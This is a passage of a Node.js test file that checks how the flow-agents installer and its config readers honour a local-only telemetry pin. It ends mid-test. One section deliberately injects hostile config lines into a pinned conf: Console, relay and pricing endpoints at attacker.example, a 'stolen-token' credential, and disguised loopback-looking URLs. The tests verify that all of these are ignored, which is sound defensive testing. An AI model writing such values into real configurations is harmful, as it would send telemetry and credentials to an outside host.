// The local-only pin (kontourai/flow-agents#1483).
//
// `--telemetry-sink local-files` typed at install records `telemetry_sink_pin=local-files` in the
// installed scripts/telemetry/telemetry.conf. Every runtime reader of the Console config must then
// skip the operator Console confs (<workspace>/.kontourai/telemetry-console.conf and
// ~/.flow-agents/telemetry-console.conf), while an explicit TELEMETRY_CONFIG_FILE still wins. An
// install without the flag writes no pin, and the operator confs keep working for it.
//
// Four readers implement that resolution separately (bash, two JS, one TS), so each one is run
// here as a child process against the SAME real installed workspace, with an exact environment
// (the spawnSync `env` option replaces the parent's, like `env -i`) and a temporary HOME:
//   - scripts/telemetry/lib/config.sh           (sourced by every bash hook and relay)
//   - scripts/hooks/lib/liveness-write.js       (liveness relay spawn pre-gate)
//   - scripts/telemetry/console-board-sync.sh   (board sync gate; sources config.sh)
//   - flow-agents telemetry-doctor              (src/cli/telemetry-doctor.ts)
//
// Run: `npm run test:unit`, or after `npm run build` and `node build/src/cli.js build-bundles`:
//   node --test src/cli/telemetry-local-pin.test.mjs
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { spawn, spawnSync } from "node:child_process";
import http from "node:http";
import net from "node:net";
import { makeFixtureDir } from "./fixture-temp-dir.mjs";

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..", "..");
const cli = path.join(repoRoot, "build", "src", "cli.js");
const NODE_PATH = `${path.dirname(process.execPath)}:/usr/bin:/bin:/usr/sbin:/sbin`;
// console-board-sync.sh looks for a `flow-agents` bin on PATH once its gate passes; a PATH
// without the node directory keeps a globally installed one out, so the run stops at a
// recorded SKIP instead of calling a real Console.
const SHELL_PATH = "/usr/bin:/bin:/usr/sbin:/sbin";
const PIN_LINE = /^telemetry_sink_pin=local-files$/m;

const GLOBAL_URL = "http://127.0.0.1:9";
const WORKSPACE_URL = "http://127.0.0.1:7";
const EXPLICIT_URL = "http://127.0.0.1:8";

function writeConf(file, url, token) {
  fs.mkdirSync(path.dirname(file), { recursive: true });
  fs.writeFileSync(file, `console_telemetry_url=${url}\nconsole_telemetry_token=${token}\n`, { mode: 0o600 });
  fs.chmodSync(file, 0o600);
}

function runInit(args, home, extraEnv = {}) {
  const result = spawnSync(process.execPath, [cli, "init", ...args, "--yes"], {
    cwd: home,
    env: { HOME: home, PATH: NODE_PATH, XDG_CONFIG_HOME: path.join(home, ".config"), ...extraEnv },
    encoding: "utf8",
  });
  return { ...result, output: `${result.stdout}\n${result.stderr}` };
}

// One real install per pin state, shared by the reader matrix. Each case gets its own HOME and
// creates/removes the workspace conf inside the shared destination itself.
function install(label, sinkArgs) {
  const home = makeFixtureDir(`telemetry-pin-${label}-install-home-`);
  const dest = path.join(makeFixtureDir(`telemetry-pin-${label}-dest-`), "ws");
  const result = runInit(["--runtime", "base", "--dest", dest, ...sinkArgs], home);
  assert.equal(result.status, 0, result.output);
  return { dest, output: result.output };
}

const pinned = install("pinned", ["--telemetry-sink", "local-files"]);
const unpinned = install("unpinned", []);

function installedConf(dest) {
  return path.join(dest, "scripts", "telemetry", "telemetry.conf");
}

function readConfigSh(dest, env) {
  const script = 'source "$1"; printf "%s\\n%s\\n%s\\n%s\\n" "$TELEMETRY_CONFIG_FILE" "$CONSOLE_TELEMETRY_URL" "${FLOW_AGENTS_CONSOLE_ECONOMICS_RELAY:-}" "${FLOW_AGENTS_CONSOLE_LIVENESS_RELAY:-}"';
  const result = spawnSync("/bin/bash", ["-c", script, "_", path.join(dest, "scripts", "telemetry", "lib", "config.sh")], { env: { PATH: SHELL_PATH, ...env }, encoding: "utf8" });
  assert.equal(result.status, 0, result.stderr);
  const [file, url, economics, liveness] = result.stdout.split("\n");
  return { file, url, economics, liveness };
}

function readLivenessWrite(dest, env) {
  const script = "const m = require(process.argv[1]); process.stdout.write(JSON.stringify({ file: m.resolveConsoleConfPath(process.env), enabled: m.resolveLivenessRelayEnabled(process.env) }));";
  const result = spawnSync(process.execPath, ["-e", script, path.join(dest, "scripts", "hooks", "lib", "liveness-write.js")], { env: { PATH: NODE_PATH, ...env }, encoding: "utf8" });
  assert.equal(result.status, 0, result.stderr);
  return JSON.parse(result.stdout);
}

function readDoctor(dest, env) {
  const result = spawnSync(process.execPath, [cli, "telemetry-doctor", "--dest", dest, "--json", "--headless", "--timeout-ms", "300"], { env: { PATH: NODE_PATH, ...env }, encoding: "utf8" });
  const report = JSON.parse(result.stdout);
  return { file: report.telemetry.configFile, url: report.console.url, pinned: report.telemetry.localOnlyPinned, skipped: report.telemetry.skippedConfigFiles, warnings: report.warnings };
}

// Whether console-board-sync.sh passed its "URL and token resolved" gate: past it, the script
// writes its log (here a SKIP, since no flow-agents CLI is reachable); gated off, it writes none.
function boardSyncPassedGate(dest, env) {
  const log = path.join(dest, ".kontourai", "telemetry", "console-board-sync.log");
  fs.rmSync(log, { force: true });
  const repo = makeFixtureDir("telemetry-pin-board-repo-");
  const result = spawnSync("/bin/bash", [path.join(dest, "scripts", "telemetry", "console-board-sync.sh")], { env: { PATH: SHELL_PATH, FLOW_AGENTS_BOARD_SYNC_CWD: repo, ...env }, encoding: "utf8" });
  assert.equal(result.status, 0, result.stderr);
  if (!fs.existsSync(log)) return false;
  assert.match(fs.readFileSync(log, "utf8"), /SKIP: no flow-agents CLI found/);
  return true;
}

function readAll(dest, env) {
  return { configSh: readConfigSh(dest, env), liveness: readLivenessWrite(dest, env), doctor: readDoctor(dest, env), boardSync: boardSyncPassedGate(dest, env) };
}

// Readers spell the same file differently (Node's require() realpaths liveness-write.js's
// __dirname; bash and the doctor keep the logical path), so compare canonical paths.
function real(file) {
  return file && fs.existsSync(file) ? fs.realpathSync(file) : file;
}

function assertResolved(observed, { file, url, relays, pinned: pinnedFlag }) {
  file = real(file);
  observed.configSh.file = real(observed.configSh.file);
  observed.liveness.file = real(observed.liveness.file);
  observed.doctor.file = real(observed.doctor.file);
  assert.equal(observed.configSh.file, file, "config.sh resolved file");
  assert.equal(observed.configSh.url, url ?? "", "config.sh CONSOLE_TELEMETRY_URL");
  assert.equal(observed.configSh.economics, relays ? "1" : "", "config.sh economics relay");
  assert.equal(observed.configSh.liveness, relays ? "1" : "", "config.sh liveness relay");
  assert.equal(observed.liveness.file, file, "liveness-write.js resolved file");
  assert.equal(observed.liveness.enabled, Boolean(relays), "liveness-write.js relay pre-gate");
  assert.equal(observed.doctor.file, file, "telemetry-doctor resolved file");
  assert.equal(observed.doctor.url, url ? `${url}/` : undefined, "telemetry-doctor Console URL");
  assert.equal(observed.doctor.pinned, pinnedFlag, "telemetry-doctor localOnlyPinned");
  assert.equal(observed.boardSync, Boolean(url), "console-board-sync.sh gate");
}

function withWorkspaceConf(dest, fn) {
  const file = path.join(dest, ".kontourai", "telemetry-console.conf");
  writeConf(file, WORKSPACE_URL, "workspace-token");
  try {
    return fn(file);
  } finally {
    fs.rmSync(file, { force: true });
  }
}

function homeWithGlobalConf(label) {
  const home = makeFixtureDir(`telemetry-pin-${label}-home-`);
  const file = path.join(home, ".flow-agents", "telemetry-console.conf");
  writeConf(file, GLOBAL_URL, "global-token");
  return { home, file };
}

// --- the installer --------------------------------------------------------------------------

test("init --telemetry-sink local-files records the pin and the summary reports it", () => {
  const conf = fs.readFileSync(installedConf(pinned.dest), "utf8");
  assert.match(conf, PIN_LINE);
  assert.match(pinned.output, new RegExp(`✓ Telemetry pinned local-only in ${installedConf(pinned.dest).replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}`));
});

test("init with no --telemetry-sink writes no pin and claims none", () => {
  assert.doesNotMatch(fs.readFileSync(installedConf(unpinned.dest), "utf8"), /telemetry_sink_pin/);
  assert.doesNotMatch(unpinned.output, /pinned local-only|local-only pin/);
});

test("init with no --telemetry-sink on a machine with an operator conf suggests the pin", () => {
  const { home, file } = homeWithGlobalConf("suggest");
  const dest = path.join(makeFixtureDir("telemetry-pin-suggest-dest-"), "ws");
  const result = runInit(["--runtime", "base", "--dest", dest], home);
  assert.equal(result.status, 0, result.output);
  assert.match(result.output, new RegExp(`Telemetry config resolved from: ${file.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")} \\(user-global`));
  assert.match(result.output, /re-run init with `--telemetry-sink local-files`, which pins it/);
  assert.doesNotMatch(fs.readFileSync(installedConf(dest), "utf8"), /telemetry_sink_pin/);
});

test("init --telemetry-sink local-files on a machine with an operator conf resolves the installed conf", () => {
  const { home } = homeWithGlobalConf("pinned-install");
  const dest = path.join(makeFixtureDir("telemetry-pin-pinned-install-dest-"), "ws");
  const result = runInit(["--runtime", "base", "--dest", dest, "--telemetry-sink", "local-files"], home);
  assert.equal(result.status, 0, result.output);
  assert.match(result.output, new RegExp(`✓ Telemetry config resolved from: ${installedConf(dest).replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}\n`));
  assert.match(result.output, /- Console: not configured/);
});

// install-console-config.sh is where the pin is written; run it directly against a copy of the
// bundle's scripts/telemetry so each rule is visible on its own.
function telemetryCopy(label) {
  const ws = path.join(makeFixtureDir(`telemetry-pin-icc-${label}-`), "ws");
  fs.cpSync(path.join(repoRoot, "dist", "base", "scripts", "telemetry"), path.join(ws, "scripts", "telemetry"), { recursive: true });
  return { ws, conf: path.join(ws, "scripts", "telemetry", "telemetry.conf"), script: path.join(ws, "scripts", "telemetry", "install-console-config.sh") };
}

function runInstaller(script, args, env = {}) {
  const home = makeFixtureDir("telemetry-pin-icc-home-");
  const result = spawnSync("/bin/bash", [script, ...args], { env: { HOME: home, PATH: SHELL_PATH, ...env }, encoding: "utf8" });
  return { ...result, output: `${result.stdout}\n${result.stderr}`, home };
}

test("install-console-config.sh: a typed local-files sink pins the installed telemetry.conf", () => {
  const { conf, script } = telemetryCopy("typed");
  const result = runInstaller(script, [conf, "--telemetry-sink", "local-files"]);
  assert.equal(result.status, 0, result.output);
  assert.match(fs.readFileSync(conf, "utf8"), PIN_LINE);
  assert.match(result.stdout, /Pinned telemetry to local files/);
});

test("install-console-config.sh: no sink, an environment-only sink, or local-files with a Console URL does not pin", () => {
  for (const [label, args, env] of [
    ["none", [], {}],
    ["env", [], { FLOW_AGENTS_TELEMETRY_SINK: "local-files" }],
    ["url", ["--telemetry-sink", "local-files", "--console-url", GLOBAL_URL], {}],
  ]) {
    const { conf, script } = telemetryCopy(label);
    const result = runInstaller(script, [conf, ...args], env);
    assert.equal(result.status, 0, `${label}: ${result.output}`);
    assert.doesNotMatch(fs.readFileSync(conf, "utf8"), /telemetry_sink_pin/, label);
  }
});

test("install-console-config.sh: selecting a Console sink later removes the pin", () => {
  const { conf, script } = telemetryCopy("lift");
  assert.equal(runInstaller(script, [conf, "--telemetry-sink", "local-files"]).status, 0);
  assert.match(fs.readFileSync(conf, "utf8"), PIN_LINE);
  const result = runInstaller(script, [conf, "--telemetry-sink", "local-kontour-console", "--console-tenant", "t1"]);
  assert.equal(result.status, 0, result.output);
  const after = fs.readFileSync(conf, "utf8");
  assert.doesNotMatch(after, /telemetry_sink_pin/);
  assert.match(after, /^console_telemetry_url=/m);
});

test("install-console-config.sh: never writes a pin into an operator conf", () => {
  const { script } = telemetryCopy("operator");
  const home = makeFixtureDir("telemetry-pin-operator-home-");
  const operatorConf = path.join(home, ".flow-agents", "telemetry-console.conf");
  fs.mkdirSync(path.dirname(operatorConf), { recursive: true });
  const result = runInstaller(script, [operatorConf, "--telemetry-sink", "local-files"], { HOME: home });
  assert.equal(result.status, 0, result.output);
  assert.equal(fs.existsSync(operatorConf), false, "no file written for a pin-only request");
  assert.doesNotMatch(result.stdout, /Pinned/);
});

// --- the readers ----------------------------------------------------------------------------

test("unpinned, no operator conf: every reader resolves the installed telemetry.conf", () => {
  const home = makeFixtureDir("telemetry-pin-unpinned-bare-home-");
  assertResolved(readAll(unpinned.dest, { HOME: home }), { file: installedConf(unpinned.dest), url: undefined, relays: false, pinned: false });
});

test("unpinned + user-global conf: every reader uses the operator conf (today's precedence)", () => {
  const { home, file } = homeWithGlobalConf("unpinned-global");
  assertResolved(readAll(unpinned.dest, { HOME: home }), { file, url: GLOBAL_URL, relays: true, pinned: false });
});

test("unpinned + workspace conf: every reader uses the workspace conf (today's precedence)", () => {
  const { home } = homeWithGlobalConf("unpinned-workspace");
  withWorkspaceConf(unpinned.dest, (file) => {
    assertResolved(readAll(unpinned.dest, { HOME: home }), { file, url: WORKSPACE_URL, relays: true, pinned: false });
  });
});

test("pinned, no operator conf: every reader resolves the installed telemetry.conf", () => {
  const home = makeFixtureDir("telemetry-pin-pinned-bare-home-");
  const observed = readAll(pinned.dest, { HOME: home });
  assertResolved(observed, { file: installedConf(pinned.dest), url: undefined, relays: false, pinned: true });
  assert.deepEqual(observed.doctor.skipped, []);
});

test("pinned + user-global conf: every reader skips the operator conf", () => {
  const { home, file } = homeWithGlobalConf("pinned-global");
  const observed = readAll(pinned.dest, { HOME: home });
  assertResolved(observed, { file: installedConf(pinned.dest), url: undefined, relays: false, pinned: true });
  assert.deepEqual(observed.doctor.skipped, [file]);
});

test("pinned + workspace conf: every reader skips the workspace conf too", () => {
  const home = makeFixtureDir("telemetry-pin-pinned-workspace-home-");
  withWorkspaceConf(pinned.dest, (file) => {
    const observed = readAll(pinned.dest, { HOME: home });
    assertResolved(observed, { file: installedConf(pinned.dest), url: undefined, relays: false, pinned: true });
    assert.deepEqual(observed.doctor.skipped, [file]);
  });
});

test("pinned + TELEMETRY_CONFIG_FILE: the explicit file still wins over the pin", () => {
  const { home } = homeWithGlobalConf("pinned-explicit");
  const explicit = path.join(makeFixtureDir("telemetry-pin-explicit-"), "explicit.conf");
  writeConf(explicit, EXPLICIT_URL, "explicit-token");
  assertResolved(readAll(pinned.dest, { HOME: home, TELEMETRY_CONFIG_FILE: explicit }), { file: explicit, url: EXPLICIT_URL, relays: true, pinned: false });
});

test("pinned: an untrusted operator conf draws no warning, since it is never read", () => {
  const home = makeFixtureDir("telemetry-pin-untrusted-home-");
  const file = path.join(home, ".flow-agents", "telemetry-console.conf");
  writeConf(file, GLOBAL_URL, "global-token");
  fs.chmodSync(file, 0o644);
  const result = spawnSync("/bin/bash", ["-c", 'source "$1"', "_", path.join(pinned.dest, "scripts", "telemetry", "lib", "config.sh")], { env: { HOME: home, PATH: SHELL_PATH }, encoding: "utf8" });
  assert.equal(result.status, 0, result.stderr);
  assert.doesNotMatch(result.stderr, /not trusted/);
  assert.deepEqual(readDoctor(pinned.dest, { HOME: home }).warnings, []);
  // Control: the unpinned install does warn about the same file.
  const control = spawnSync("/bin/bash", ["-c", 'source "$1"', "_", path.join(unpinned.dest, "scripts", "telemetry", "lib", "config.sh")], { env: { HOME: home, PATH: SHELL_PATH }, encoding: "utf8" });
  assert.match(control.stderr, /not trusted/);
});

// --- --global installs ----------------------------------------------------------------------

test("init --global claude-code with --telemetry-sink local-files says no pin is recorded and writes none", () => {
  const home = makeFixtureDir("telemetry-pin-global-claude-home-");
  const packageConf = path.join(repoRoot, "scripts", "telemetry", "telemetry.conf");
  const before = fs.readFileSync(packageConf, "utf8");
  const result = runInit(["--runtime", "claude-code", "--global", "--telemetry-sink", "local-files"], home, { FLOW_AGENTS_USER_CLAUDE_SETTINGS: path.join(home, ".claude", "settings.json") });
  assert.equal(result.status, 0, result.output);
  assert.match(result.stderr, /--telemetry-sink local-files does not pin `init --global` for claude-code local-only/);
  assert.doesNotMatch(result.stdout, /pinned local-only|Pinned telemetry/);
  assert.equal(fs.readFileSync(packageConf, "utf8"), before, "the package's own telemetry.conf is never pinned");
});

test("init --global codex with --telemetry-sink local-files pins the Codex home's telemetry.conf", () => {
  const home = makeFixtureDir("telemetry-pin-global-codex-home-");
  const dest = path.join(makeFixtureDir("telemetry-pin-global-codex-dest-"), "codex-home");
  const result = runInit(["--runtime", "codex", "--global", "--dest", dest, "--telemetry-sink", "local-files"], home);
  assert.equal(result.status, 0, result.output);
  assert.match(fs.readFileSync(installedConf(dest), "utf8"), PIN_LINE);
  assert.doesNotMatch(result.stderr, /does not pin/);
});

// --- interactive init -------------------------------------------------------------------------
//
// Interactive init only runs on a TTY (a piped stdin is treated as headless), so these drive it
// through a pseudo-terminal with Python's pty module, answering each prompt as it appears.
const PTY_DRIVER = `
import json, os, pty, select, sys, time
argv, env, steps = json.loads(sys.argv[1])
pid, fd = pty.fork()
if pid == 0:
    os.execve(argv[0], argv, env)
out = b""
def read_until(needle, deadline):
    global out
    while needle.encode() not in out:
        if time.time() > deadline:
            raise SystemExit("timed out waiting for " + repr(needle) + "; output so far: " + out.decode(errors="replace"))
        ready, _, _ = select.select([fd], [], [], 0.5)
        if ready:
            try:
                chunk = os.read(fd, 4096)
            except OSError:
                chunk = b""
            if not chunk:
                raise SystemExit("child exited waiting for " + repr(needle) + "; output: " + out.decode(errors="replace"))
            out += chunk
for needle, answer in steps:
    read_until(needle, time.time() + 120)
    out = out.split(needle.encode(), 1)[1]
    os.write(fd, (answer + "\\r").encode())
while True:
    try:
        chunk = os.read(fd, 4096)
    except OSError:
        break
    if not chunk:
        break
    out += chunk
_, status = os.waitpid(pid, 0)
sys.stdout.write(out.decode(errors="replace"))
sys.exit(os.waitstatus_to_exitcode(status))
`;

const python = ["/usr/bin/python3", "/usr/local/bin/python3", "/opt/homebrew/bin/python3"].find((candidate) => fs.existsSync(candidate));

function runInteractiveInit(args, steps) {
  const home = makeFixtureDir("telemetry-pin-interactive-home-");
  const file = path.join(home, ".flow-agents", "telemetry-console.conf");
  writeConf(file, GLOBAL_URL, "global-token");
  const env = { HOME: home, PATH: NODE_PATH, XDG_CONFIG_HOME: path.join(home, ".config"), TERM: "dumb" };
  const result = spawnSync(python, ["-I", "-c", PTY_DRIVER, JSON.stringify([[process.execPath, cli, "init", ...args], env, steps])], { cwd: home, encoding: "utf8", timeout: 240000 });
  return { ...result, output: `${result.stdout}\n${result.stderr}` };
}

const KIT_PROMPT = "Activate kits by id";
const PROVIDER_PROMPT = "Configure GitHub backlog, assignment, and change providers?";

test("interactive init: answering Skip at the Console prompt does not pin", { skip: python ? false : "python3 (pty driver) not found" }, () => {
  const dest = path.join(makeFixtureDir("telemetry-pin-interactive-skip-"), "ws");
  const result = runInteractiveInit(["--runtime", "base", "--dest", dest], [["Connect to Kontour Console?", "skip"], [KIT_PROMPT, ""], [PROVIDER_PROMPT, "n"]]);
  assert.equal(result.status, 0, result.output);
  assert.match(result.output, /Telemetry sink \(selected\): local-files/);
  assert.doesNotMatch(fs.readFileSync(installedConf(dest), "utf8"), /telemetry_sink_pin/);
  assert.match(result.output, /re-run init with `--telemetry-sink local-files`, which pins it/);
});

test("interactive init: a typed --telemetry-sink local-files pins", { skip: python ? false : "python3 (pty driver) not found" }, () => {
  const dest = path.join(makeFixtureDir("telemetry-pin-interactive-flag-"), "ws");
  const result = runInteractiveInit(["--runtime", "base", "--dest", dest, "--telemetry-sink", "local-files"], [[KIT_PROMPT, ""], [PROVIDER_PROMPT, "n"]]);
  assert.equal(result.status, 0, result.output);
  assert.match(fs.readFileSync(installedConf(dest), "utf8"), PIN_LINE);
  assert.match(result.output, /Telemetry pinned local-only in /);
});

// --- uninstall and re-install ------------------------------------------------------------------
//
// The ownership manifest records telemetry.conf as installed (pin included), so uninstall removes
// it, and a re-install resets it to the bundle's bytes before applying the new invocation's sink.
test("uninstall removes a pinned install's telemetry.conf", () => {
  const home = makeFixtureDir("telemetry-pin-uninstall-home-");
  const dest = path.join(makeFixtureDir("telemetry-pin-uninstall-dest-"), "ws");
  const installed = runInit(["--runtime", "claude-code", "--dest", dest, "--telemetry-sink", "local-files"], home);
  assert.equal(installed.status, 0, installed.output);
  assert.match(fs.readFileSync(installedConf(dest), "utf8"), PIN_LINE);
  const removed = runInit(["--uninstall", "--runtime", "claude-code", "--dest", dest], home);
  assert.equal(removed.status, 0, removed.output);
  assert.equal(fs.existsSync(installedConf(dest)), false, removed.output);
});

test("re-running init without --telemetry-sink drops the pin; with it, keeps it", () => {
  const home = makeFixtureDir("telemetry-pin-reinit-home-");
  const dest = path.join(makeFixtureDir("telemetry-pin-reinit-dest-"), "ws");
  for (const [args, pinnedAfter] of [[["--telemetry-sink", "local-files"], true], [["--telemetry-sink", "local-files"], true], [[], false]]) {
    const result = runInit(["--runtime", "base", "--dest", dest, ...args], home);
    assert.equal(result.status, 0, result.output);
    assert.equal(PIN_LINE.test(fs.readFileSync(installedConf(dest), "utf8")), pinnedAfter, `${args.join(" ") || "(no sink flag)"}: ${result.output}`);
    assert.doesNotMatch(result.output, /preserved scripts\/telemetry\/telemetry\.conf/);
  }
});

test("a typed local-files sink over a user-edited telemetry.conf reports the pin as NOT recorded", () => {
  const { home } = homeWithGlobalConf("not-recorded");
  const dest = path.join(makeFixtureDir("telemetry-pin-not-recorded-dest-"), "ws");
  assert.equal(runInit(["--runtime", "base", "--dest", dest], home).status, 0);
  // A user edit makes the file not bundle-owned, so the next init preserves it untouched.
  fs.appendFileSync(installedConf(dest), "# edited by the user\n");
  const result = runInit(["--runtime", "base", "--dest", dest, "--telemetry-sink", "local-files"], home);
  assert.equal(result.status, 0, result.output);
  assert.doesNotMatch(fs.readFileSync(installedConf(dest), "utf8"), /telemetry_sink_pin/);
  assert.match(result.output, /! Telemetry local-only pin: requested with --telemetry-sink local-files but NOT recorded: \S+telemetry\.conf was edited after it was installed, so init preserved it unchanged/);
  assert.doesNotMatch(result.output, /✓ Telemetry pinned local-only/);
  assert.doesNotMatch(result.output, /re-run init with `--telemetry-sink local-files`/);
});

// --- a pinned telemetry.conf names no network destination (review round 1) ----------------------
//
// The installed telemetry.conf can be repository-supplied (mode 644), and the pin makes it outrank
// a trusted operator conf. So for a pinned install it may not supply a Console URL, credentials, a
// relay opt-in, a pricing URL, or a non-loopback channel endpoint.
const HOSTILE = "https://attacker.example";

function withInstalledConf(dest, edit, fn) {
  const file = installedConf(dest);
  const original = fs.readFileSync(file, "utf8");
  fs.writeFileSync(file, edit(original));
  try {
    return fn(file);
  } finally {
    fs.writeFileSync(file, original);
  }
}

function readShellVars(dest, env, names) {
  const script = `source "$1"; ${names.map((name) => `printf '%s\\n' "\${${name}:-}"`).join("; ")}`;
  const result = spawnSync("/bin/bash", ["-c", script, "_", path.join(dest, "scripts", "telemetry", "lib", "config.sh")], { env: { PATH: SHELL_PATH, ...env }, encoding: "utf8" });
  assert.equal(result.status, 0, result.stderr);
  return Object.fromEntries(result.stdout.split("\n").slice(0, names.length).map((value, index) => [names[index], value]));
}

const HOSTILE_KEYS = [
  `console_telemetry_url=${HOSTILE}`,
  `console_url=${HOSTILE}`,
  `console_telemetry_endpoint_url=${HOSTILE}/api/telemetry/records`,
  "console_telemetry_token=stolen-token",
  "console_tenant_id=hostile-tenant",
  "console_economics_relay=1",
  "console_liveness_relay=1",
  `console_economics_endpoint_url=${HOSTILE}/records`,
  `console_liveness_endpoint_url=${HOSTILE}/records`,
  `console_pricing_url=${HOSTILE}/pricing`,
  `pricing_url=${HOSTILE}/pricing`,
  `channel.analytics.endpoint_url=${HOSTILE}/events`,
].join("\n");

test("pinned conf carrying a Console URL and credentials over a trusted operator conf: nothing resolves", () => {
  const { home } = homeWithGlobalConf("hostile");
  withInstalledConf(pinned.dest, (text) => `${text}${HOSTILE_KEYS}\n`, () => {
    const vars = readShellVars(pinned.dest, { HOME: home }, [
      "TELEMETRY_CONFIG_FILE", "CONSOLE_TELEMETRY_URL", "CONSOLE_TELEMETRY_ENDPOINT_URL", "CONSOLE_TELEMETRY_TOKEN", "CONSOLE_TENANT_ID",
      "FLOW_AGENTS_CONSOLE_ECONOMICS_RELAY", "FLOW_AGENTS_CONSOLE_LIVENESS_RELAY", "FLOW_AGENTS_CONSOLE_ECONOMICS_ENDPOINT_URL",
      "FLOW_AGENTS_CONSOLE_LIVENESS_ENDPOINT_URL", "TELEMETRY_PRICING_URL", "TELEMETRY_CHANNEL_ANALYTICS_ENDPOINT_URL", "TELEMETRY_CHANNEL_FULL_ENDPOINT_URL",
    ]);
    assert.equal(real(vars.TELEMETRY_CONFIG_FILE), real(installedConf(pinned.dest)));
    for (const name of ["CONSOLE_TELEMETRY_URL", "CONSOLE_TELEMETRY_ENDPOINT_URL", "CONSOLE_TELEMETRY_TOKEN", "CONSOLE_TENANT_ID", "FLOW_AGENTS_CONSOLE_ECONOMICS_RELAY", "FLOW_AGENTS_CONSOLE_LIVENESS_RELAY", "FLOW_AGENTS_CONSOLE_ECONOMICS_ENDPOINT_URL", "FLOW_AGENTS_CONSOLE_LIVENESS_ENDPOINT_URL", "TELEMETRY_PRICING_URL", "TELEMETRY_CHANNEL_ANALYTICS_ENDPOINT_URL"]) {
      assert.equal(vars[name], "", `config.sh ${name}`);
    }
    // The shipped loopback channel is on-machine and keeps working.
    assert.equal(vars.TELEMETRY_CHANNEL_FULL_ENDPOINT_URL, "http://localhost:3141/v1/agent-events");
    assert.equal(readLivenessWrite(pinned.dest, { HOME: home }).enabled, false, "liveness pre-gate");
    const doctor = JSON.parse(spawnSync(process.execPath, [cli, "telemetry-doctor", "--dest", pinned.dest, "--json", "--headless", "--timeout-ms", "300"], { env: { PATH: NODE_PATH, HOME: home }, encoding: "utf8" }).stdout);
    assert.equal(doctor.console.sink, "local-only");
    assert.equal(doctor.console.url, undefined);
    assert.equal(doctor.console.tokenConfigured, false);
    assert.equal(doctor.console.tenantConfigured, false);
    assert.equal(doctor.telemetry.channels.find((channel) => channel.name === "analytics")?.endpointUrl, undefined);
    assert.equal(boardSyncPassedGate(pinned.dest, { HOME: home }), false, "board sync gate");
  });
});

test("pinned conf: a non-loopback or disguised channel endpoint is dropped, a loopback one kept", () => {
  const home = makeFixtureDir("telemetry-pin-channel-home-");
  for (const [url, kept] of [
    ["http://127.0.0.1:3141/v1/agent-events", true],
    ["http://[::1]:3141/x", true],
    ["http://localhost:3141@attacker.example/x", false],
    ["http://localhost.attacker.example/x", false],
    [`${HOSTILE}/x`, false],
  ]) {
    withInstalledConf(pinned.dest, (text) => `${text}channel.full.endpoint_url=${url}\n`, () => {
      const vars = readShellVars(pinned.dest, { HOME: home }, ["TELEMETRY_CHANNEL_FULL_ENDPOINT_URL"]);
      // The shipped line still precedes this one, so a dropped URL leaves the shipped loopback default.
      assert.equal(vars.TELEMETRY_CHANNEL_FULL_ENDPOINT_URL, kept ? url : "http://localhost:3141/v1/agent-events", url);
      const doctor = readDoctorReport(pinned.dest, { HOME: home });
      assert.equal(doctor.telemetry.channels.find((channel) => channel.name === "full")?.endpointUrl, kept ? new URL(url).toString() : "http://localhost:3141/v1/agent-events", `doctor ${url}`);
    });
  }
});

test("pinned conf: a relay opt-out still applies when the environment supplies a Console URL", () => {
  const home = makeFixtureDir("telemetry-pin-optout-home-");
  withInstalledConf(pinned.dest, (text) => `${text}console_economics_relay=0\nconsole_liveness_relay=0\n`, () => {
    const env = { HOME: home, CONSOLE_TELEMETRY_URL: EXPLICIT_URL };
    const vars = readShellVars(pinned.dest, env, ["CONSOLE_TELEMETRY_URL", "FLOW_AGENTS_CONSOLE_ECONOMICS_RELAY", "FLOW_AGENTS_CONSOLE_LIVENESS_RELAY"]);
    assert.deepEqual(vars, { CONSOLE_TELEMETRY_URL: EXPLICIT_URL, FLOW_AGENTS_CONSOLE_ECONOMICS_RELAY: "0", FLOW_AGENTS_CONSOLE_LIVENESS_RELAY: "0" });
    assert.equal(readLivenessWrite(pinned.dest, env).enabled, false);
  });
});

function readDoctorReport(dest, env) {
  const result = spawnSync(process.execPath, [cli, "telemetry-doctor", "--dest", dest, "--json", "--headless", "--timeout-ms", "300"], { env: { PATH: NODE_PATH, ...env }, encoding: "utf8" });
  return JSON.parse(result.stdout);
}

// --- a pinned install that still sends to a Console says so -------------------------------------

test("doctor: pinned + a Console URL in the environment warns and names the variable", () => {
  const home = makeFixtureDir("telemetry-pin-envurl-home-");
  const report = readDoctorReport(pinned.dest, { HOME: home, CONSOLE_TELEMETRY_URL: EXPLICIT_URL });
  assert.equal(report.console.sink, "console");
  assert.equal(report.console.endpointSource, "environment variable CONSOLE_TELEMETRY_URL");
  assert.ok(report.warnings.some((warning) => /pinned local-only .* but a Console endpoint still resolves from environment variable CONSOLE_TELEMETRY_URL/.test(warning)), JSON.stringify(report.warnings));
});

test("doctor: pinned + TELEMETRY_CONFIG_FILE with a Console URL warns and names the file", () => {
  const home = makeFixtureDir("telemetry-pin-explicit-warn-home-");
  const explicit = path.join(makeFixtureDir("telemetry-pin-explicit-warn-"), "explicit.conf");
  writeConf(explicit, EXPLICIT_URL, "explicit-token");
  const report = readDoctorReport(pinned.dest, { HOME: home, TELEMETRY_CONFIG_FILE: explicit });
  assert.equal(report.telemetry.pinRecorded, true);
  assert.equal(report.console.endpointSource, `TELEMETRY_CONFIG_FILE (${explicit})`);
  assert.ok(report.warnings.some((warning) => warning.includes(`still resolves from TELEMETRY_CONFIG_FILE (${explicit})`)), JSON.stringify(report.warnings));
});

test("doctor: a pinned install with no Console source draws no pin warning", () => {
  const home = makeFixtureDir("telemetry-pin-nowarn-home-");
  assert.deepEqual(readDoctorReport(pinned.dest, { HOME: home }).warnings, []);
});

test("init summary: pinned with TELEMETRY_CONFIG_FILE carrying a Console URL says the install is NOT local-only", () => {
  const home = makeFixtureDir("telemetry-pin-summary-explicit-home-");
  const explicit = path.join(makeFixtureDir("telemetry-pin-summary-explicit-"), "explicit.conf");
  writeConf(explicit, EXPLICIT_URL, "explicit-token");
  const dest = path.join(makeFixtureDir("telemetry-pin-summary-explicit-dest-"), "ws");
  const result = runInit(["--runtime", "base", "--dest", dest, "--telemetry-sink", "local-files"], home, { TELEMETRY_CONFIG_FILE: explicit });
  assert.equal(result.status, 0, result.output);
  assert.match(fs.readFileSync(installedConf(dest), "utf8"), PIN_LINE);
